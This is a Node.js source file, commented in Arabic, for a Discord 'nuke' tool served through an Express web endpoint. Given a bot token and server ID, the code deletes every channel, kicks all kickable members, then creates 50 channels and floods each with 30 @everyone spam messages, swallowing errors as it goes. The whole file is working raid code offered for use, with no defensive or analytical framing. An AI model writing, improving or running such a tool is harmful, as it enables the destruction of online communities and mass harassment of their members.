const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(express.static('.'));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/run-nuke', async (req, res) => {
    const { token, guildId, roomName, message, delChannels, kickMembers } = req.body;

    // تفعيل كافة الصلاحيات (Intents) - هذا أهم جزء ليعمل البوت
    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMembers, 
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ] 
    });

    client.on('ready', async () => {
        console.log(`[V5] البوت اشتغل: ${client.user.tag}`);
        
        try {
            const guild = await client.guilds.fetch(guildId).catch(() => null);
            if (!guild) return console.log("السيرفر غير موجود أو البوت مو فيه!");

            // --- V5 SPEED EXECUTION ---

            // 1. حذف كل الرومات فوراً
            if (delChannels) {
                guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
            }

            // 2. طرد الأعضاء (للي رتبتهم أقل من البوت)
            if (kickMembers) {
                guild.members.cache.forEach(m => {
                    if (m.kickable) m.kick("Lord V5").catch(() => {});
                });
            }

            // 3. إنشاء رومات وسبام (سرعة جنونية)
            for (let i = 0; i < 50; i++) {
                guild.channels.create({
                    name: roomName || "nuked-by-lord",
                    type: ChannelType.GuildText
                }).then(channel => {
                    // إرسال 30 رسالة في كل روم يتم إنشاؤه
                    for (let j = 0; j < 30; j++) {
                        channel.send(message || "@everyone V5 HERE").catch(() => {});
                    }
                }).catch(() => {});
            }

        } catch (err) {
            console.error("حدث خطأ:", err);
        }
    });

    client.login(token).catch(() => console.log("التوكن خطأ!"));
    res.json({ status: "ok" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
